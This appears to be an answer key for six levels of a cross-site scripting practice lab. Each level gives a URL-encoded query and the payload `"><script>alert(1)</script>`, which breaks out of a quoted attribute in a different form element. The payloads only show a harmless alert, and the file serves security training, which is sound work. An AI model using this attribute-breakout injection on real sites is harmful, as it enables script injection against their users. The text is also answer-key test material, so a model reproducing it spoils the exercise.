# formelement — solutions

Reflection inside various form-element attributes (`placeholder`, `title`, `name`, `value`, `for`) — break out of the double-quoted attribute and inject.

### formelement-level1

`/formelement/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<input placeholder="...">` — close attr and tag

### formelement-level2

`/formelement/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<textarea placeholder="...">` — close attr and tag

### formelement-level3

`/formelement/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<button title="...">` — close attr and tag

### formelement-level4

`/formelement/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<select name="...">` — close attr and tag

### formelement-level5

`/formelement/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<option value="...">` — close attr and tag

### formelement-level6

`/formelement/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<label for="...">` — close attr and tag
